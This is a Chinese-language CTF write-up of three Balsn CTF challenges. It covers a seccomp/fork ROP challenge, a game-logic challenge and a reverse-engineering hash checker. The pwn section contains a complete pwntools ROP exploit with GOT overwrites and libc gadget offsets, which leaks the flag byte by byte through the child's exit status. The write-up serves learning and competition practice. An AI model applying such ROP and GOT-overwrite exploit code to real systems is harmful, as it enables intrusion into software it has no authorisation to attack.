## Pwn

### or⊕w

```
// file
orxw: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e0ea32e6a5da07877fd550b0e4155a33dc707d85, for GNU/Linux 3.2.0, not stripped

// checksec
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   77 Symbols     No	0		1	/tmp/dist/src/orxw
```



程式非常簡單，parent 的 seccomp 只允許 write，而 child 的 seccomp 能夠 open 以及 read，我們能 BOF 寫入大量的 gadget 做 ROP 來 exploit。不過 parent 與 child 只會共享 `fork()` 前的記憶體，在 `fork()` 後就以 COW 的機制來 handle 各自的記憶體，這樣無法用直觀的方式："寫到某處並讓 parent 讀取" 來印出 flag。觀察後發現 parent 會執行 `wait(&status)` 等待 child 結束，而 child 的 exit status 為 1 個 byte 的大小，可以用來傳遞一個字元的 flag。

找到該如何傳遞 flag 後，下一步就是找 gadget 讓 child 與 parent 能夠執行同個 ROP 但有不同的行為，經過一陣子的測試與搜尋，最終用以下方法完成：

1. 把 GOT 中 `puts` 的 address 透過加 offset 改成 `write`，就先叫 `write_got`

2. ROP chain 先跑 `isprint(*(&status+1))`，此時會因為 parent 與 child 得到值的不同 ZF 有差別

3. 控制 rdi 放 `write_got`，rdx 放 `read_got`

4. 再來跳 libc 的 gadget：

   ```asm
   je 0x124300 ; ret 
   0x124300:
   mov    rax,QWORD PTR [rdi] 
   mov    QWORD PTR [rdx],rax 
   mov eax, 0x1
   ret
   ```

   在這時 parent 會把 `read_got` 蓋成 `write`，而 child 則什麼都不會做

5. 控制 rdi 放 1，rsi 放 `&status+1`， rdx 放 0x10

6. 跳到 `read_plt`，如果是 parent 就會跑 `write(1, &status+1, 0x10)`，印出 flag

   - 如果是 child 就會跑 `read(1, &status+1, 0x10)`，syscall 參數爛掉只會傳 -1 所以沒差

7. 執行後續 child 在讀取 flag 的操作，而 parent 會因為 seccomp abort 不過沒差，因為已經印出 flag 了



exploit：

```python
#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

leave_ret = 0x40138c
pop_rdi_ret = 0x401573
pop_rsi_r15_ret = 0x401571
add_prbp_ebx_ret = 0x40125c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret 
dword_or_offset = 4294966560 # open - read 
setbuf_got = 0x404040
setbuf_plt = 0x401130
put_plt = 0x401110
puts_got = 0x404030
read_plt = 0x401160
read_got = 0x404058
pop_rbx_rbp_r12_r13_r14_r15_ret = 0x40156a
csu_init_2 = 0x401550
csu_init_1 = 0x40156A
status = 0x40408C + 1
pop_rbp_ret = 0x40125d
fork_got = 0x404068
fork_plt = 0x401180
exit_plt = 0x4010f0
put_got = 0x404030
secinit_got = 0x404018
secinit_plt = 0x4010e0
secadd_got = 0x404028
secadd_plt = 0x401100

def add_val(addr, val):
    payload = p64(pop_rbx_rbp_r12_r13_r14_r15_ret) + p64(val) + p64(addr + 0x3d) + b''.join([p64(i) for i in range(15-12+1)]) 
    payload += p64(add_prbp_ebx_ret)
    return payload

# offset

#pop_rdi_ret + status+1
g1 = 0xffffb3f4 #0x00000000000e1464 : mov eax, dword ptr [rdi] ; ret
#(write_got,0)
g2 = 0xfff498c7 #0x000000000002ad2b : xchg eax, edi ; ret 
g3 = 0x00c365 # isprint
#pop_rdi_ret + write_got
final = 0x0e5c4f #0x000000000011ccdf : mov rdi, qword ptr [rbp] ; call rbx ; mov    eax,DWORD PTR [rbx+0x4]

gg1 = 0x089c30 # write put offset
ggg1 = 0xfff2fb7d # je 0x124300 ...
gggg1 = 0xfff6da16 #0x0000000000162866 : pop rdx ; pop rbx ; ret

#0x00000000000e1464 : mov eax, dword ptr [rdi] ; ret
#0x00000000000abae8 : add rax, rdi ; ret
#0x000000000015433a : xor byte ptr [rsi], al ; add byte ptr [rax - 0x77], cl ; ret
#0x00000000000a4778 : je 0xa477e ; xor byte ptr [rdx + 0xe], 0x2a ; ret
#0x0000000000130008 : je 0x13001e ; pop rbx ; xor eax, eax ; pop r12 ; pop rbp ; ret
#0x0000000000046a2b : add edi, esi ; ret 0
#0x00000000000aa23d : xchg eax, esi ; ret
#0x000000000002ad2b : xchg eax, edi ; ret 
#0x0000000000197df8 : xchg eax, edx ; ret
#0x0000000000162866 : pop rdx ; pop rbx ; ret
#0x00000000001242fd : je 0x124300 ; ret
# mov    rax,QWORD PTR [rdi]
# mov    QWORD PTR [rdx],rax
# mov eax, 0x1 ; ret
# isprint

flag = b'BALSN{m4yb3_ORE_w1ll_b3_7h3_n3w_tr3nd???}'
for i in range(len(flag), 41):
    r = remote('orxw.balsnctf.com', 19091)
    ######## ROP ########
    payload = b'A'*0x18 # dummy

    #### write put@got to write ####
    payload += add_val(put_got, gg1)
    payload += add_val(secinit_got, ggg1)
    payload += add_val(secadd_got, gggg1)

    #### write/nop ####
    payload += p64(pop_rdi_ret) + p64(status)
    payload += add_val(fork_got, g1)
    payload += p64(fork_plt)

    payload += p64(secadd_plt)
    payload += p64(put_got) + p64(0)

    payload += add_val(fork_got, g2)
    payload += p64(fork_plt)
    payload += add_val(fork_got, g3)
    payload += p64(fork_plt)
    payload += p64(pop_rdi_ret) + p64(read_got)
    payload += p64(secinit_plt)
    payload += p64(pop_rdi_ret) + p64(1)
    payload += p64(pop_rsi_r15_ret) + p64(status) + p64(1)
    payload += p64(secadd_plt)
    payload += p64(1) + p64(0)
    payload += p64(put_plt)

    #### open ####
    payload += add_val(setbuf_got, 0x82200)
    payload += add_val(status, 0x67616c66)
    payload += p64(pop_rdi_ret) + p64(status)
    payload += p64(pop_rsi_r15_ret) + p64(0)*2
    payload += p64(setbuf_plt)

    #### read ####
    payload += p64(csu_init_1) + p64(0) + p64(1) + p64(0) + p64(status) + p64(0x400) + p64(read_got) + p64(csu_init_2)
    payload += b''.join([p64(i) for i in range(7)])

    #### exit ####
    payload += p64(pop_rdi_ret) + p64(status)
    payload += add_val(fork_got, final)
    payload += p64(pop_rbx_rbp_r12_r13_r14_r15_ret) + p64(exit_plt) + p64(status+i) + b''.join([p64(i) for i in range(15-12+1)]) 
    payload += p64(fork_plt)

    print(hex(len(payload)))
    #gdb.attach(r,"set follow-fork-mode parent")
    #gdb.attach(r,"")
    r.sendafter('Can you defeat orxw?\n', payload)
    flag += r.recv(1)
    print(flag)
    r.close()

print("here is your flag: " + flag.decode())
```



## Misc

### unicorn’s aisle ~prelude~

這題就簡單的 trace code，除了 asm 外，作者也好心附上 python code，看完 code 就知道目標很明確，打敗 unicorn 就會 trigger handler，然後 handler 在判斷 syscall number 為一個 magic number 後就會噴第一把 flag，所以下一步要知道遊戲怎麼玩。整個遊戲大概為：

1. 你是一個冒險者，遇到了 unicorn，你可以選擇逃跑或是跟他戰鬥
2. 戰鬥後，會有一堆選項讓你選，不過一些選項並不會消耗回合數，而攻擊相關的選項會讓 unicorn 也開始行動
3. 你有預設的攻擊方式，但是你可以自己做武器，並且任意的升級武器，而且這也不會消耗回合數
4. 武器有一些屬性，包含範圍、攻擊力、CD、屬性等等，這些也能自己構造，不過有些屬性會有上限，如果超過則被判斷建構失敗
5. 透過切換武器的命令，可以讓你裝備你剛剛製作的武器
6. 在裝備武器並攻擊後，會進行攻擊範圍的判斷，需要冒險者的所在地+攻擊範圍與 unicorn 重疊到才可以攻擊


當知道遊戲機制後，就能透過傳送對應指令來構造出一把攻擊力夠、射程遠、距離判斷都符合的武器，最後透過攻擊命令打敗 unicorn 即可。exploit 如下：

```python
#!/usr/bin/python3

from pwn import *
import time

context.arch = 'amd64'

r = remote('unicorn.balsnctf.com', 10101)
"""
size_t rax;
size_t rdi;
size_t rsi;
size_t rdx;
size_t r10;
size_t r8;
size_t r9;
"""

## atk state ##
STATE_NONE = 0
ATTACK_SET = 0x10
ATTACK_CLEAR_MASK = 0xffffffffffffff00
STATE_ATTACKHIGH_LEFT = 0x10
STATE_ATTACKHIGH_RIGHT = 0x11
STATE_ATTACKMIDDLE_LEFT = 0x12
STATE_ATTACKMIDDLE_RIGHT = 0x13
STATE_ATTACKLOW_LEFT = 0x14
STATE_ATTACKLOW_RIGHT = 0x15
# 5 bit : 0    0   0   0    0
#        ATK |NO |  DIR  | L/R
# DIR: 0 --> HIGH
# DIR: 1 --> MIDDLE
# DIR: 2 --> LOW
# or maybe DIR == level ?
HIGH = 0
MIDDLE = 1
LOW = 2

## action ##
IDLE = 0x00
STARTBATTLE = 0x01
RETREAT = 0x02
CRAFTWEAPON = 0x03
SWITCHWEAPON = 0x04
ENHANCEWEAPON = 0x05
DISPOSEWEAPON = 0x06
ATTACK = 0x07
DEFEND = 0x08
MOVE = 0x09
GIVEUP = 0xff

## move ##
MOVE_SHIFT = 0x10
MOVE_SET = 0x100000
MOVE_CLEAR_MASK = 0xffffffffff00ffff
MOVE_LEFT = 0x100000
MOVE_RIGHT = 0x110000

## weapon attr ##
ATTR_FIRE = 0x1
ATTR_ICE = 0x2
ATTR_LIGHT = 0x4
ATTR_DARKNESS = 0x8
ATTR_NONE = 0xf

actionStruct = {
    'action': 1,
    'union': '', # size: 0x278
}

confrontState = {
    'isConfront': 0,
    'unicornStage': 0,
    'unicornHP': 0,
    'unicornAttack': 0,
    'unicornDefense': 0,
    'unicornState': 0,
    'unicornAttribute': 0,
    'unicornCD': 0,
    'unicornDefenseGauge': 0,
    'unicornLoc': 0,
    'unicornAttackSourceLoc': 0,
    'unicornAttackBoxLoc': 0,
    'adventurerHP': 0,
    'adventurerAttack': 0,
    'adventurerDefense': 0,
    'adventurerState': 0,
    'adventurerCD': 0,
    'adventurerDefenseGauge': 0,
    'adventurerLoc': 0,
    'adventurerAttackSourceLoc': 0,
    'adventurerAttackBoxLoc': 0,
    'adventurerWeaponIdx': 0,
    'adventurerName': 0, # 0x100
    'adventurerDesc': 0, # 0x100
}

craftWeaponStruct = {
    'namelen': 0,
    'desclen': 0,
    'attack': 0,
    'defense': 0,
    'attribute': 0,
    'CD': 0,
    'range': 0,
    'delta': 0,
    'movespeed': 0,
    'name': 0, # 0x100
    'desc': 0, # 0x100
}

def get_resp():
    r.recv(1)
    data = r.recv()
    print(f"recv size: {hex(len(data))}")
    i = 0
    for k, _ in confrontState.items():
        confrontState[k] = u64(data[i:i+8])
        i += 8
        if i == 0xb0:
            break
    confrontState['adventurerName'] = data[0xb0:0x1b0]
    confrontState['adventurerDesc'] = data[0x1b0:0x2b0]
    print(confrontState)
    if data[0x2b0:] != b'':
        print("Rest data: ", data[0x2b0:])

def sendcmd(cmd):
    assert(len(cmd) <= 0x280 - 4)
    r.send(p32(len(cmd)))
    time.sleep(0.5)
    r.send(cmd)
    get_resp()

def create_weapon(atk, defense, attr, CD, ran, delta, movespeed):
    assert(delta != 0)
    return p64(CRAFTWEAPON) + p64(1) * 2 + p64(atk) + p64(defense) + p64(attr) + p64(CD) + p64(ran) + p64(delta) + p64(movespeed) + b'A'.ljust(0x100, b'\x00') + b'B'

def start_battle(name, desc):
    assert(len(name) <= 0x100 and len(desc) <= 0x100)
    return p64(STARTBATTLE) + p64(len(name)) + p64(len(desc)) + name.encode().ljust(0x100, b'\x00') + desc.encode()

def switch_weapon(idx):
    return p64(SWITCHWEAPON) + p64(idx)

def enhance_weapon(idx):
    return p64(ENHANCEWEAPON) + p64(idx)

def attack(level):
    return p64(ATTACK) + p64(level)

sendcmd( start_battle('AAAA', 'BBBB') )
sendcmd( create_weapon(0x10000, 0x1000, ATTR_NONE, 0x1, 2000, 1600, 0x1000) )
sendcmd( switch_weapon(0) )
sendcmd( enhance_weapon(0) )
sendcmd( attack(LOW) )
r.interactive()
```



## Rev

### The g++ VM 1

程式會讀取 input，並將 input 分成 6 組，每組 6 個字元，之後我們的 input 會 taint 到接下來要執行的 hash function，最後會得到一組 hash value。而後根據當前的組數，hash value 會被丟進不同的 checker function 做一些操作，若回傳結果與某些已知的 value 相同的話，就代表這段為正確的 input 繼續下一輪。當 6 組都通過後，整個 input 就是 flag，因此關鍵在於 hash function 與 checker function 究竟做了什麼。

稍微瀏覽後，會發現這些 function 有幾種特徵：

1. function name 被 C++ 的 mangle 做了 obfuscated，而在 demangle 後還是很長很難看
2. function 很深， subfunction 將近有 3, 40 層才到底
3. subfunction 的行為基本上很簡單
4. 我們的輸入會在 hash function 前被 assign 到 6 個全域變數中，而 hash function 中使用到這 6 個全域變數

因為 hash function 相對較短，因此我先從這 6 個變數的 xref 開始看起，最後發現是一組可以化簡的數學式子，先暫時放一邊。而後又透過同樣的手法，從得到的 hash value 被 xref 的地方開始追，追到後來發現他就是在執行 `(hash value)^n % M`，M 能輕鬆求出，n 則要追完整個 function 才會知道。不過當我要乖乖逆出 `n` 前，隊友 maple3142 說這是一個簡單的求方根，他可以負責，詳細請參考[此文](https://blog.maple3142.net/2021/11/21/balsn-ctf-2021-writeups/#the-g-vm-1)，最後他用了半個鐘頭把剩下數學的部分做掉了 XD

不過我比較想知道是否有其他不要這麼 hardcode 的方式來看，不然如果程式在複雜一點，就不能這樣玩了。